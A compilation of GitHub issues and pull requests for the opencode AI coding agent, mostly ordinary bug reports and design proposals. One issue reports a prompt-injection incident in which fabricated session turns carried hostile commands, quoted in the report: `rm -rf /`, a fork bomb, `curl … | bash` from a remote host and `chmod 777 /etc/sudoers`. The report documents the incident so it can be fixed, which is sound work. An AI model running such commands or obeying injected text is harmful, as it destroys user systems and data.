issues.title: Feature request: .ocdx renderer bundle support for third-party GUI extensions
issues.body:
## Feature request: `.ocdx` renderer bundle support for third-party GUI extensions

### Current behavior (retail builds)

Installed third-party `.ocdx` extensions only run their **main entry**; the renderer side only loads **built-in** extensions. The settings page states this explicitly: *"Built-in GUI extensions in this window. Development builds only."* There is also no install UI for third-party extensions in retail builds.

This means a third-party extension can contribute main-process capabilities (menubar items, IPC) but **cannot contribute any window-side UI** (panels, slots, settings pages) in a retail build.

### What we built and verified (dev build)

We implemented a built-in extension (`open-gen-ui`) in a dev build that renders agent-generated interactive HTML in a side panel:

- **React island**: the extension's SolidJS panel mounts a React 19 subtree (`react-dom/client` `createRoot`) hosting the OpenIntelligentUI renderer layer (Idiomorph + `@jetbrains/websandbox` sandboxed iframe).
- **Full chain verified end-to-end**: agent generates an HTML document via an MCP tool → turn-end event (`session.execution.succeeded`) → panel auto-opens → React island mounts → websandbox iframe renders the widget (charts and tables verified). Manual entry points (a `session.panel` MenuItem and a Command) also work.
- Screenshots of the running extension (settings page showing `open-gen-ui = Active`, rendered widgets) are available on request.

The implementation required only: a `vite` config tweak (`solidPlugin` exclude for the React files), `react`/`react-dom`/`@jetbrains/websandbox` as dependencies, and standard `Extension.define` registration. Nothing exotic — the SDK already supports everything needed on the dev side.

### Request

Support **renderer bundles in the `.ocdx` format** so third-party extensions can contribute window-side UI (panels/slots/settings pages), not just main-process capabilities. Concretely:

1. Allow an `.ocdx` archive to ship a renderer bundle that the host loads like built-in extensions do.
2. Provide an install path in retail builds (the `install()` bridge exists in shipped code but has no UI).

### Why it matters

The generative-UI use case (CopilotKit/OpenIntelligentUI style: agent output rendered as interactive charts/tables/diagrams instead of plain markdown) fundamentally needs renderer-side rendering of agent output. Today this is only possible by patching the app or running a dev build — neither is viable for end users. With `.ocdx` renderer support, this whole class of extensions becomes distributable.

We're happy to share the dev-build implementation, screenshots, or upstream the extension itself if that helps move this forward.

Phantom external_directory prompt when a compound command uses a relative cd
issues.body:
### Description

When a shell command changes directory twice and the second change is relative, opencode asks for access to a directory outside the project that the command never touches.

```sh
cd /abs/project/admin-ui && grep -n x app/pages/index.vue; cd ../backend && git status
```

`../backend` from `project/admin-ui` is `project/backend`, inside the project. With `external_directory: * → ask` the prompt asks for `/abs/backend/*` instead — a sibling of the project root.

The scanned `cd` arguments are all resolved against one fixed cwd, so the directory reached by the first `cd` is ignored. `packages/opencode/src/tool/shell.ts` in v1.19.3 does exactly that (`argPath(arg, cwd, …)` inside `collect(root, cwd, …)`, with `cwd` never advancing); v2.1.1 resolves the extracted directories against the shell job's cwd the same way. v1 rarely hit it because its shell description told the model to avoid `cd` chains ("AVOID using `cd <directory> && <command>`. Use the `workdir` parameter instead"), an instruction v2 dropped from the tool description.

### Plugins

_No response_

### OpenCode version

2.1.1


### Steps to reproduce

Use `~`-less absolute paths, or the same relative form, from the project root.

1. Two layer directories inside one project:

```sh
mkdir -p /tmp/oc-repro/project/layer-a /tmp/oc-repro/project/layer-b
cd /tmp/oc-repro/project && git init
```

2. `opencode.json` in the project root:

```json
{
	"$schema": "https://opencode.ai/config.json",
	"permissions": [
		{ "action": "external_directory", "resource": "*", "effect": "ask" }
	]
}
```

3. Run this command (in the TUI, or `opencode run "…"` — non-interactive runs auto-reject and log the request):

```sh
cd /tmp/oc-repro/project/layer-a && ls; echo done; cd ../layer-b && ls
```

Actual (v2.1.1, macOS, zsh):

```
! permission requested: external_directory (/private/tmp/oc-repro/layer-b/*); auto-rejecting
```

Expected: no request. Replacing the second `cd` with an absolute path produces none.


## Fix suggested

Track `cd`/`pushd` state while walking the command list and resolve each argument against the current directory, or don't assert `external_directory` for relative arguments containing `..`. Restoring the "avoid `cd`, use `workdir`" line in the tool description is only a mitigation.

﻿## Description

Requests to `deepseek-v4.1-flash` on the OpenCode Go endpoint fail with

```
HTTP 429
{"error":{"type":"server_error","message":"Upstream request failed: Endpoint is unavailable."}}
```

while other Go models return `200` on the **same API key, same endpoint, in the same minute**.

This lines up with the open incident on status.opencode.ai ("Upstream provider issues — Go: deepseek-v4-pro and deepseek-v4.1-flash are seeing increased error rates", started Oct 20 23:44 UTC), but for this workspace the failures started earlier and are still happening now. `deepseek-v4-pro` returns `503` with the same body.

## Control matrix

`2026-10-21T02:47Z`, one Go key, endpoint `https://opencode.ai/zen/go/v1/chat/completions`, requests issued back-to-back, all carrying `x-opencode-session`:

| model | attempt | HTTP | `x-opencode-log-id` |
|---|---|---|---|
| `deepseek-v4.1-flash` | 1 | **429** | `01a15c5b-2540-7917-84d2-80df4fc4fab0` |
| `deepseek-v4.1-flash` | 2 | **429** | `01a15c5b-27d8-71f9-ab7e-008307fdc82e` |
| `glm-5.3` | 1 | 200 | `01a15c5b-2a4a-7c41-a486-f149cedf4d96` |
| `glm-5.3` | 2 | 200 | `01a15c5b-2dec-7e56-a6cd-a4b19d1ff8eb` |
| `kimi-k2.7-code` | 1 | 200 | `01a15c5b-311f-76d2-bc97-a976470f03bd` |
| `kimi-k2.7-code` | 2 | 200 | `01a15c5b-3665-7ab7-8bb3-50b002cfdb88` |
| `minimax-m3.1-flash-free` | 1 | 200 | `01a15c5b-418e-7d6e-9544-ee4a6f870717` |
| `minimax-m3.1-flash-free` | 2 | 200 | `01a15c5b-4655-76f1-ae6f-58a14449dd7e` |

Minimal body used:

```json
{"model":"<model id>","messages":[{"role":"user","content":"hi"}],"max_tokens":8}
```

Earlier in the same window `deepseek-v4.1-flash` alternated inconsistently (`429`, then `200`, then `200`) for identical requests, which is what makes it hard to work around at the client level.

## Steps to reproduce

1. Use a Go key whose workspace has an active subscription and region set to **Global**.
2. `POST /zen/go/v1/chat/completions` with `"model": "deepseek-v4.1-flash"` and a minimal body.
3. Observe `429` / `503` `Upstream request failed: Endpoint is unavailable.`
4. Repeat with `glm-5.3`, `kimi-k2.7-code` or `minimax-m3.1-flash-free` seconds later — all return `200`.

## Environment

- **Client:** Hermes Agent `v0.21.7+132.gf594424` (sends a stable `x-opencode-session` per conversation; includes PR #101864)
- **Endpoint:** `https://opencode.ai/zen/go/v1/chat/completions`
- **Wire format:** `chat_completions`
- **Workspace region:** Global
- **OS:** server Ubuntu 22.04, client Windows 11
- **Terminal:** OrcaTerm
- **OpenCode version:** N/A (not an OpenCode client)

## Impact

Every agent turn fails on the primary model. Since 2026-10-20T17:24Z, six scheduled runs in this workspace failed at this step. Workaround is pinning a non-DeepSeek model, which loses the DeepSeek quota the plan is priced around.

## Questions

1. Is a healthy upstream endpoint currently configured for the `deepseek-v4.1-flash` `chat/completions` route? The error carries an `x-opencode-log-id` but no `x-opencode-endpoint-id`, which in #53120 was the signature of the gateway giving up before an endpoint served the request.
2. #53120 describes per-conversation sticky provider binding (`stickyId = sessionId ?? workspaceID ?? ip`) that is only written on success. If this workspace got bound to a dead endpoint, can that binding be reset server-side, or does it expire on its own?
3. Given the status page reports monitoring data as missing on and off, is there a better signal we can watch than the public status page?

Happy to provide the full request/response dumps or more log ids if useful.

migration: V1→V2 data migration permanently stalls on legacy session row with directory='.'
issues.body:
## Summary

The V1→V2 data migration permanently stalls when the legacy `session` table contains a row with `directory = '.'` (relative). The migration copies the row into `session_v2` verbatim, then the re-read through the strict `directoryColumn` schema throws `Path is not absolute: .`, the whole transaction (including the cursor update) rolls back, and every subsequent startup retries the same row and fails identically. The migration can never complete on its own.

## Environment

- opencode version: 2.1.1
- OS: Windows 10.0.26300 (win32 x64)
- Terminal: VS Code integrated terminal (TERM_PROGRAM=vscode, TERM=xterm-256color)
- Shell: cmd.exe
- Install/channel: latest
- Active plugins: superpowers (git+https://github.com/obra/superpowers.git)

## Reproduction

1. Have a database whose legacy `session` table contains at least one row with a non-absolute `directory`. In my case: 13 rows with `directory = '.'` — "ACP Session \<uuid\>" sessions created in Feb 2026 on v1.1.53 via the ACP integration (Zed), which recorded `cwd` as `.`. Verify with:
   ```sql
   SELECT id, directory FROM session WHERE directory = '.';
   ```
2. Run any 2.x server so the V1→V2 data migration starts (`kv` key `migration.v1-v2`, phase `sessions`).
3. The migration walks the legacy table `ORDER BY id DESC` with a cursor, hits the bad row, and dies. It aborts at every startup from then on.

## Expected Behavior

- A single legacy row with an invalid/relative `directory` should not be able to wedge the migration permanently. The migration should either normalize the value (e.g. resolve `.` against a sensible base) or skip-and-log the row, like `transformSession` already does for off-format message/part rows.
- `directoryColumn` already deliberately tolerates the empty string ("Legacy sessions may persist an empty directory"), but `.` hits the `absolute()` throw in `packages/core/src/database/path.ts`.

## Actual Behavior

Every startup logs:

```
level=ERROR message="V1 migration failed" cause="Cause([Die(EffectDrizzleQueryError: Failed query: select \"id\", \"project_id\", ... from \"session_v2\" where \"session_v2\".\"id\" = ?\nparams: [redacted] (cause: Cause([Fail(Error: Path is not absolute: .)])))])" role=server
```

The TUI shows a "Data migration failed" toast on every launch. The `kv` state stays at `{"phase":"sessions","cursor":"..."}` pointing at the last successfully processed row, so the same bad row is retried (and fails) on every boot.

## Root Cause (from source, v2.1.1 / current main)

In `packages/core/src/database/v1-migration.bun.ts`, the sessions phase loop per row:

1. Updates the `kv` cursor to `nextID.id` (inside the transaction).
2. `INSERT OR IGNORE INTO session_v2 (...) SELECT id, ..., directory, path, ... FROM session WHERE id = ${nextID.id}` — copies `directory` verbatim, with no normalization.
3. Re-reads the row through Drizzle: `tx.select().from(SessionTable).where(eq(SessionTable.id, ...))` — this is the failing query.
4. `directoryColumn.fromDriver` calls `absolute()` in `packages/core/src/database/path.ts`, which throws `Path is not absolute: ${input}` for `'.'` (`posix.isAbsolute('.') === false` and `isWindowsStoragePath('.') === false`).
5. The failure dies the transaction, so the cursor update from step 1 rolls back too — the migration is stuck on the same row forever.

## Workaround (verified)

Back up the database, repair the legacy rows, restart the service:

```sql
UPDATE session SET directory = 'C:/Users/User' WHERE directory = '.';
```

After restart the migration resumed from its cursor, processed the remaining 283 sessions, and completed: `migration.v1-v2` → `{"phase":"completed"}`, all 383 legacy sessions present in `session_v2`, no further startup errors.

## Additional Context

- Database: 751 MB, 383 legacy V1 sessions, 6,566 messages / 23,614 parts (all IDs well-formed, so nothing else in the pipeline was implicated).
- This is the same "one bad row aborts the whole migration" class as #55663 and #54736, but triggered by an invalid `directory` instead of a message ID.
- The bug is still present on current `main` — the migration copies `directory` verbatim and has no skip/normalize path for it.
- Frequency: consistently, on every startup, until the legacy rows are repaired manually.

issues.title: assistant: injected tool/user messages containing destructive commands appear in session
issues.body:
# Reporte de bug para opencode (github.com/sst/opencode)

**Título:**
assistant: injected tool/user messages containing destructive commands appear in session

---

## Summary

During a long interactive session, the conversation stream repeatedly contained
fabricated message blocks with destructive instructions (`rm -rf / --no-preserve-root`,
fork bombs, `curl | bash` exfiltration payloads, `chmod 777`, fake sudoers drops).
The blocks appeared positioned as tool results, as the assistant's own output, and
as fake user turns. The agent refused all of them, but a compliant agent following
such injected content would have destroyed the user's system.

## Environment

- opencode version: v2.0.32
- OS: Manjaro Linux, kernel 7.1.13-2-MANJARO (linux x64)
- Terminal: ghostty (TERM=xterm-256color, TERM_PROGRAM=ghostty, COLORTERM=truecolor)
- Shell: /bin/bash
- Install/channel: release (latest)
- Active plugins: none found (no plugin entries in config; `~/.config/opencode`
  contains only `service.json`). No MCP servers configured. Session ran in the
  user's home directory.

## Reproduction

1. Start an opencode TUI session performing many tool calls over a long period
   (file edits, shell commands — ~40+ turns).
2. Continue ordinary work with no reference to the strings below.
3. At random points, a block appears inline formatted as if it were tool output,
   the assistant's own message, or a user message, containing dangerous commands.
4. Observed ~8 times within a single session; no discernible trigger. Trigger
   events could not be identified.

## Expected Behavior

Tool results, assistant messages, and user messages contain only content that the
corresponding tool, assistant turn, or user actually produced.

## Actual Behavior

Fabricated blocks with destructive content appeared inline at unprompted moments.
Representative examples (redacted):

- Fake "user" messages requesting `rm -rf / --no-preserve-root`, `:(){ :|:& };:`,
  `curl http://<redacted-ip>/payload.sh | bash`, `chmod 777 /etc/sudoers`
- Fake assistant outputs demanding a specific confirmation string
  (e.g. "PICOM OK — sin errores GL") before continuing
- Fake tool outputs framed as "final verification steps" containing
  exfiltration commands using the user's hostname/username

Nothing was executed and a full forensic audit afterwards found no compromise:
no injected strings anywhere on the filesystem outside opencode's own session
records, no persistence (cron/systemd/ld.so.preload), no rogue listeners, no
new SUID binaries, no rogue logins. Impact is therefore prompt-injection safety
and UX confusion, not system compromise.

## Additional Context

- The injected strings exist only in `~/.local/share/opencode/log/opencode.log`
  and `opencode.db-wal` — i.e., the session transcript records themselves,
  confirming they were injected into the conversation stream rather than read
  from any file.
- The session was fully local: no plugins, no MCP servers, no web content tools
  other than built-in search/fetch (not used near the events).
- Frequency: intermittent, repeated within one session; cause unknown.
- Workarounds: explicit system-prompt refusals worked; no configuration change
  made the injections stop.

issues.body:
**Title:** Mixed stable/beta channels sharing one data dir silently split sessions across `session` and `session_v2`

**Body:**

## Environment
- macOS arm64, single shared data dir (`~/.local/share/opencode`, SQLite)
- Stable generation: CLI 1.18.15 (brew) + Desktop prod bundle (embedded server reports 1.18.21, channel `prod`)
- Beta generation: `opencode2 v0.0.0-beta-17823` (CLI) + Desktop beta bundle (`ai.opencode.desktop.beta`, bundled `opencode-cli` also v0.0.0-beta-17823)

## Observed behavior
All generations write to the same `opencode.db`, but they use **different session tables**:

| Writer | Table |
|---|---|
| stable CLI / desktop-prod embedded server | `session` |
| beta CLI / desktop-beta `opencode-cli` | `session_v2` |

The beta performs a **one-time** copy of existing `session` rows into `session_v2`, stamped in `kv` as `migration.v1-v2 = {"phase":"completed"}`. In my case it copied 73/106 rows.

Consequences observed:
1. Sessions created in stable *after* the stamp never appear in the beta (33 stranded rows in my DB).
2. Sessions created in the beta are invisible to stable CLI and to the desktop-prod embedded server (the prod bundle contains zero references to `session_v2`) — 41 such rows in my DB.
3. Nothing warns the user; each surface just shows a different session list against what looks like one workspace history.

## Expected behavior
Either:
- **Continuous (or lazy/read-through) migration**, so `session` rows created after the one-shot stamp flow into `session_v2`; and/or
- Older readers fall back to reading `session_v2` (union view) so beta-created sessions are visible; or
- Per-channel database files by default (like the existing non-standard-channel `opencode-<channel>.db` path) plus a clear warning when a second generation opens an existing data dir.

## Repro
1. Use stable CLI/desktop to create sessions in `~/.local/share/opencode`.
2. Install/run the beta channel (`opencode2` / OpenCode Beta desktop). First run migrates a snapshot into `session_v2`.
3. Create more sessions in stable → they never appear in beta. Create sessions in beta → they never appear in stable/prod-desktop.

## Data
DB snapshot at time of writing: `session` = 106 rows, `session_v2` = 112 (73 migrated + 41 beta-native; overlap 73).

---

issues.title: [FEATURE]: Add a structured argv execution mode to the existing shell tool
issues.body:
- [x] I have verified this feature I'm about to request hasn't been suggested before.

I searched the public issue index for `exec_argv`, literal stdin, and similar structured-execution terms and did not find an equivalent proposal. This was a targeted search, not a guarantee that no related discussion exists.

## Summary

I propose extending the existing shell execution tool with a structured single-process mode, rather than adding a second agent-facing tool. The result would remain one execution system and one permission capability with two input modes:

- **shell mode**: the current command-string behavior, for shell grammar;
- **process mode**: one direct child process described by a program and argument vector (argv), without inserting the configured shell.

This keeps permissions, hooks, environment policy, timeout, cancellation, output handling, truncation, and user experience in one execution path. It also preserves the existing `bash` tool/permission identity for compatibility until any planned OpenCode 2.0 rename.

## Motivation

The current tool exposes only `{ command, timeout?, workdir? }`, parses the command string with Tree-sitter for permission resources, and executes it through the configured shell. That is necessary for pipelines and other shell constructs, but it makes every simple native command cross a quoting and parsing boundary even when no shell behavior is needed.

A structured mode would let OpenCode pass a program and arguments directly to its process runtime. This does not replace shell mode and is not a sandbox. It only avoids shell interpretation when the requested operation is one native process.

OpenCode already has relevant internal machinery: `ChildProcess.make(program, args, options)` is supported by `packages/core/src/cross-spawn-spawner.ts`. The feature could therefore reuse the existing execution lifecycle rather than create a parallel tool implementation.

## Proposed input

Existing calls remain unchanged and imply shell mode:

```json
{
  "command": "git status",
  "workdir": "/path/to/repository",
  "timeout": 30000
}
```

A structured call could use an explicit discriminator:

```json
{
  "mode": "process",
  "program": "git",
  "args": [
    "commit",
    "-m",
    "literal multiline message"
  ],
  "stdin": "optional literal input",
  "workdir": "/path/to/repository",
  "timeout": 30000
}
```

Suggested schema rules:

- omitting `mode` preserves the historical `command` shape;
- `mode: "process"` requires a non-empty `program` and an `args` array, which may be empty;
- `args` contains strings directly, not a JSON-encoded array;
- `command` cannot be combined with `program` or `args`;
- unknown modes, mixed shapes, invalid types, and unsupported combinations fail before permission evaluation or process creation;
- literal stdin is initially limited to process mode.

The exact discriminator and field names are open to maintainer preference.

## Process-mode semantics

- Launch one direct child process through the runtime's structured `program` plus `args` API, without inserting the configured shell.
- Pass spaces, quotes, newlines, empty arguments, and shell metacharacters as argument data rather than shell syntax.
- Keep shell mode for pipelines, redirects, expansions, compound commands, shell built-ins, and other shell grammar.
- An explicitly invoked interpreter such as `bash -c`, `python -c`, or `node -e` remains able to interpret code and must not be treated as intrinsically safe.
- Executable lookup, scripts requiring an interpreter, and `.cmd`/`.bat` behavior must be defined per supported platform. Unsupported executable forms should fail clearly rather than silently changing modes.
- Platform tests should verify the runtime's documented behavior for spaces, quotes, newlines, empty arguments, and metacharacters. The claim is direct structured invocation without an inserted shell, not identical operating-system argv internals on every platform.

“One process” here means one direct child; the child may create descendants.

## Permission and audit semantics

Both modes should consult the same execution permission capability. This is necessary but not sufficient: changing representation must not accidentally broaden an existing `allow`, `ask`, or `deny` rule.

For process mode:

- permission evaluation should receive the structured program and argument tokens, without reparsing a shell command string;
- the implementation should define a deterministic canonical representation for compatibility with existing string rules;
- the human-readable preview must be derived from, but never reused as, the execution source;
- raw structured values used internally for matching must be distinguished from escaped display metadata and persisted audit data;
- compatibility should be tested with representative rules and arguments containing spaces, quotes, empty strings, newlines, and metacharacters;
- if a request cannot be represented or classified unambiguously, it must not receive broader permission by default.

Exact tokens improve fidelity but do not reveal all effects. Path and `external_directory` checks may consume exact token boundaries where applicable, but argv alone cannot identify every path, wrapper, interpreter payload, network effect, or filesystem mutation. This mode must not be presented as a sandbox or authorization boundary.

## Literal stdin

stdin should be explicit and bounded:

- when absent, the child receives closed/ignored stdin and never inherits terminal user interface (TUI) input;
- when present, it is a bounded UTF-8 string; binary stdin is outside this initial proposal;
- the runtime writes all bytes while handling backpressure and write errors, then closes stdin immediately after the final byte, and only then waits for process completion;
- empty stdin is distinct at the schema level from absent stdin, but both produce an observable end-of-file rather than an inherited or dangling stream;
- timeout, cancellation, early child exit, or broken pipe must close or destroy the input stream cleanly;
- literal stdin should not be copied into permission prompts, routine logs, or persisted audit data by default. Presence and byte length can be shown; any preview/redaction policy should be explicit.

A regression test should include a child that reads until end-of-file.

## Shared lifecycle

Process mode should reuse, or reach observable parity with, the existing shell path for:

- working-directory validation;
- `shell.env` and environment construction;
- plugin hooks;
- execution permission and `external_directory` gates;
- timeout and cancellation;
- process-group cleanup where supported;
- stdout/stderr collection, truncation, exit status, and error reporting;
- tool metadata and UI lifecycle.

Each item should have focused compatibility coverage rather than being assumed from sharing a tool name.

Structured per-call environment overrides could be useful because they avoid `VAR=value command` wrappers, but I would leave them outside the initial scope until secret visibility and permission semantics are defined.

## Non-goals

- Replacing shell mode.
- Supporting shell grammar inside process mode.
- Creating a sandbox or proving a program's effects.
- Automatically treating direct execution as safe.
- Adding structured pipelines in the initial change.
- Adding per-call environment overrides before their permission and secret-handling contract is clear.

## Related reports

The proposal would avoid some shell-specific failure paths for process-mode calls, without claiming to resolve every report:

- [#42402](https://github.com/anomalyco/opencode/issues/42402): Windows PowerShell 5.1 can silently strip or split native arguments and still return success.
- [#39884](https://github.com/anomalyco/opencode/issues/39884): PowerShell escaping can corrupt verbatim Markdown and JSON.
- [#39931](https://github.com/anomalyco/opencode/issues/39931), [#42436](https://github.com/anomalyco/opencode/issues/42436), and [#42184](https://github.com/anomalyco/opencode/issues/42184): command parsing and normalization materially affect permission behavior and fail-closed design.
- [#41612](https://github.com/anomalyco/opencode/issues/41612) and [#42773](https://github.com/anomalyco/opencode/issues/42773): inherited or dangling stdin can interfere with the TUI or leave children waiting indefinitely.
- [#38376](https://github.com/anomalyco/opencode/issues/38376): direct executable lookup has Windows-specific `.cmd` constraints that the design must address explicitly.
- [#43775](https://github.com/anomalyco/opencode/pull/43775): native no-shell spawning is already being used for a narrower internal Windows Git path, although not as an agent-facing mode.

Relevant current sources:

- [`tool/shell/prompt.ts`](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/shell/prompt.ts)
- [`tool/shell.ts`](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/shell.ts)
- [`tool/shell/id.ts`](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/shell/id.ts)
- [`permission/arity.ts`](https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/permission/arity.ts)
- [`cross-spawn-spawner.ts`](https://github.com/anomalyco/opencode/blob/dev/packages/core/src/cross-spawn-spawner.ts)

## Acceptance criteria

- Existing command-string calls remain compatible.
- Process mode has an unambiguous validated schema and launches through the structured runtime API without inserting the configured shell.
- Argument-boundary behavior is tested on every supported platform, including the platform-specific executable resolution contract.
- Both modes evaluate the same execution permission capability, with deterministic representation and fail-closed behavior for ambiguous cases.
- Existing representative permission rules are regression-tested against process mode.
- stdin is never inherited, is closed by default, and explicit UTF-8 stdin is fully written and closed before waiting for process completion.
- Both modes have verified parity for the shared lifecycle items listed above.
- User-facing previews are not execution sources, and stdin is not exposed or persisted by default.
- Documentation tells the model to prefer process mode for a single native program and shell mode only when shell grammar is required.
- The documentation explicitly states that neither mode is a sandbox and that interpreters and wrappers remain powerful.

## Open design questions

1. Is the input best represented by an explicit `mode`, or by another unambiguous discriminated shape?
2. What canonical process representation should preserve useful compatibility with existing string-based `bash` permission rules without making ambiguous requests broader?
3. Should the UI show both an escaped command preview and a structured program/argument view?
4. What executable forms are supported directly on Windows, especially `.cmd` and `.bat`?
5. Should bounded literal stdin later become available to shell mode as well?

I have a working local custom-tool prototype on Linux that exercises direct argv, bounded literal stdin, timeout/output limits, and explicit permission requests. It is not integrated with the shell tool, does not validate the shared-permission design above, and has not been established as cross-platform. If this direction is useful, I would be happy to prepare an implementation for review.

issues.title: fix-project-copy-tag-matching
issues.body:
### Description

packages/server/src/handlers/project-copy.ts identifies errors with instanceof, which compares class identity. When @opencode-ai/core is loaded more than once in a process — duplicate installs, bundler boundaries, or a workspace that path-maps the core specifiers — the service constructs the error from one copy and the handler checks it against another, so every check returns false.

Result: forceRequired is dropped from the 400 response when deleting a project copy with a dirty worktree, so a client can't prompt the user to retry with force. The five ProjectCopy messages also fall through to error.message and surface raw git output instead of the formatted text.

test/server/project-copy.test.ts covers this — the "lists directories and manages git worktree copies" case asserts forceRequired: true.

### Plugins

_No response_

### OpenCode version

_No response_

Not reproducible in a stock checkout. it needs two copies of @opencode-ai/core in one process. That happens with a duplicate install (e.g. something pinning a different core version), a bundler that doesn't dedupe, or a workspace that path-maps the core specifiers. In that situation the service constructs the error from one copy and the handler checks it against the other, so instanceof returns false while the code looks correct.

issues.title: Long assistant responses truncated mid-generation with thinking model opencode-go/hy3 (no local config knob)
issues.body:
## Summary

When the orchestrator model is a "thinking" model served by the `opencode-go` provider (e.g. `opencode-go/hy3`), long assistant responses — including long internal reasoning — are **truncated mid-generation**. The message simply stops, often mid-sentence, with no error. This makes it impossible to complete multi-step tasks that require long output; the agent appears to "hang" or "interrupt."

## Environment

- OpenCode client (Go build, model reported as `opencode-go/hy3`)
- OS: Windows
- The `opencode-go` provider is enabled via the `oh-my-opencode-slim` preset (`"preset": "opencode-go"` in `~/.config/opencode/oh-my-opencode-slim.json`)

## Reproduction

1. Set the orchestrator to a thinking model such as `opencode-go/hy3`.
2. Give it a task that requires a long reasoning trace or a long response (e.g. analyzing a ~970-line script, counting struct fields, etc.).
3. The assistant response is cut off partway through, repeatedly, even when the intended output is not that large.

## Key observation

The model ID `opencode-go/hy3` is **not present in any local config file**:

- `~/.config/opencode/opencode.jsonc` — no `hy3`
- `~/.config/opencode/opencode.json` — no `hy3`
- `~/.config/opencode/oh-my-opencode-slim.json` — preset defines `opencode-go/minimax-m3` (orchestrator, `variant: "thinking"`), `opencode-go/qwen3.7-max`, `opencode-go/deepseek-v4-flash`, `opencode-go/kimi-k2.7-code`, `opencode-go/mimo-v2.5` — but **no `hy3`**.

So there is no obvious local knob (e.g. `max_tokens` / reasoning budget) to raise the output/thinking token limit for this model. Users cannot easily work around the truncation.

## Impact

- Multi-step coding tasks that need long outputs cannot be completed.
- The agent looks broken ("thinking interrupted") to the user.
- Switching models is the only apparent workaround, but the desired model (`hy3`) is not even configurable locally.

## Request

1. Make the output / thinking token limit **configurable** for provider models (e.g. a `max_tokens` or reasoning-budget field in the model/preset config), or raise the default so long responses are not hard-truncated.
2. Document where `opencode-go/hy3` (and other `opencode-go/*` models) parameters are defined, since they are absent from the local config files.
3. Ideally, avoid silently truncating mid-generation — stream the full output or emit a clear warning/error instead of cutting off.

## Additional notes

- `gh` is authenticated (confirmed `gh auth status` → logged in to github.com as RuszLi with `repo` scope), so this can be reproduced/verified by maintainers if needed.
- This report describes the observed symptom; the exact root cause (client-side output cap vs. provider-side thinking budget) is not yet confirmed.

prs.title: perf(app): render the file tree with @pierre/trees
prs.body:
## Summary

Moves the Desktop file tree (Review pane and file browser) off `packages/gui-extensions/src/file/tree-v2.tsx` and onto `@pierre/trees` (`1.0.0-beta.6`).

- Upgrades `@pierre/trees` from `1.0.0-beta.4` to `1.0.0-beta.6`, preserving the `onExpansionChange` callback patch and adding opt-in `middleTruncate?: boolean` (default `true` so `DirectoryPickerDialog` is unchanged; `middleTruncate: false` renders `row.name` with `title={row.name}` inside `[data-item-section="content"]`, saving 14 DOM nodes and 2 CSS size containers per visible row while keeping the right/RTL-left edge fade).
- Deletes `packages/gui-extensions/src/file/tree-v2.tsx` and replaces it behind the existing `FileTree.render` contract and `SessionFileBrowserTab` caller with `PierreFileTree` (idle-preloaded in `packages/gui-extensions/src/file/renderer.tsx`).
- Unifies `SessionFileList` (`packages/gui-extensions/src/file/list.tsx`) on `@pierre/trees` `"complete"` icon resolver and sprite sheet (`1 <svg><use>` per row) so searching does not swap icon sets, and shares one `OpenInAppContextMenuV2` context menu on the tree/list wrapper while preserving `data-item-context-hover="true"` on the right-clicked row.
- Uses `@pierre/trees` incremental `applyGitStatusPatch` for git status badges (`A`/`M`/`D`) and ignored entries, `tree.batch` for incremental live directory expansion/unlink updates, `renderRowDecoration` with in-place `tree.render` for collapsed untracked folder labels (`labels` prop from PR #57527), and RTL logical spacing, chevron rotation, and `ArrowLeft`/`ArrowRight` mirroring.

## Feature Parity

| Feature | `FileTreeV2` (`tree-v2.tsx`) | `PierreFileTree` (`pierre-tree.tsx`) | Dropped? |
|---|---|---|---|
| Git status badges & colours (`A`/`M`/`D`, ignored dimming) | Per-row `<Show>` + `data-change` | `gitStatus` + incremental `applyGitStatusPatch` + `--trees-git-*-color` tokens | None |
| File & folder icons | `<FileIcon>` (2 SVGs + mask per row) | `@pierre/trees` `icons: "complete"` (1 `<svg>` sprite `<use>` per row in both tree and list) | None |

| Untracked-folder row (`dir/` + `labels` count decoration, PR #57527) | `untrackedDirs` collapsed by default + `labels` span | Canonical `dir/` paths collapsed by default + `renderRowDecoration` | None |
| Edge name fade (#55889) + tooltip | `mask-image: linear-gradient(...)` on label | `mask-image: linear-gradient(...)` + `title={row.name}` on `[data-item-section="content"]` (LTR & `:host(:dir(rtl))`) | None |

prs.title: refactor(ai): replace loose Schema.Unknown and catch-all union checks in protocols
prs.body:
## Problem

Several protocol schemas in `packages/ai` left known wire structures untyped (`Schema.Unknown` or a catch-all `Schema.Struct({ type: Schema.String })`), forcing response decoders and stream parsers to repeat runtime `isRecord`, `typeof`, and `"..." in` checks downstream.

## Change

Tighten the schema boundary across four protocols so decoded values already carry their validated shapes:

```diff
 packages/ai/src/protocols/
 ├── cohere-chat.ts          # tool parameters: Schema.Unknown -> JsonObject
 ├── gemini.ts               # event.error: Schema.Unknown -> GeminiError (StructWithRest)
 ├── google-interactions.ts  # Delta catch-all -> UnknownDelta ({ type: "unknown", rawType })
 └── xai-images.ts           # response.usage: Schema.Unknown -> lenient(JsonObject)
```

```diff
 Gemini.step(state, event)
-  if isRecord(event.error)
-    classify typeof message / status / code
-  if "error" in event
-    fail InvalidProviderOutput
+  if event.error
+    classify event.error.message || event.error.status || "Gemini provider error"

 GoogleInteractions.onDelta(state, index, delta)
-  if delta.type === "text" && "text" in delta
-  if delta.type === "thought_summary" && "content" in delta
-  if delta.type === "thought_signature" && "signature" in delta
-  if delta.type === "arguments_delta" && "arguments" in delta
+  if delta.type === "text"
+  if delta.type === "thought_summary"
+  if delta.type === "thought_signature"
+  if delta.type === "arguments_delta"
```

## Out of scope

- Untyped `error: Schema.Unknown` fields on protocols where provider error payloads can be arbitrary primitives or strings (such as `google-interactions` stream error events or `open-responses`).

prs.title: refactor(ai): deduplicate JSON, record, and URL query helpers
prs.body:
## Problem

Several modules in `packages/ai/src` redefined helpers already provided by shared utilities or callers:

- `provider-error.ts`, `protocols/utils/partial-json.ts`, and `providers/cloudflare-ai-gateway.ts` each constructed local `Schema.fromJsonString(Schema.Unknown)` codecs instead of reusing `utils/json.ts`, and `provider-error.ts` kept a local `isRecord` implementation that did not exclude arrays.
- `partial-json.ts` decoded JSON string literals as `unknown` and cast to `string` instead of decoding with `Schema.fromJsonString(Schema.String)`.
- `promise.ts` normalized `RequestInput | LLMRequest` via a duplicate `llmRequest` helper before calling `LLM.generate` and `LLM.stream`, which already normalize `RequestInput | LLMRequest` internally.
